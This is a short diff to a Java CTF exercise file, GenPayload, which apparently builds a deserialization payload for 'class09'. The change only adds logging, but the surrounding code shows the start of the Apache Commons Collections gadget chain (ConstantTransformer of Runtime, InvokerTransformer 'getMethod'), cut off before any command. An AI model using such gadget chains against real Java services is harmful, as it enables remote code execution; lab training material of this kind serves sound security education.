@@ -6,6 +6,7 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
+import com.ctfstu.common.Logger;
 
 /**
  * 生成 class09 的 payload — ChainedTransformer
@@ -19,6 +20,7 @@ import java.io.ObjectOutputStream;
  */
 public class GenPayload {
     public static void main(String[] args) throws Exception {
+        Logger.setLogLevel(Logger.DEBUG);
         Transformer[] chain = new Transformer[] {
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod",
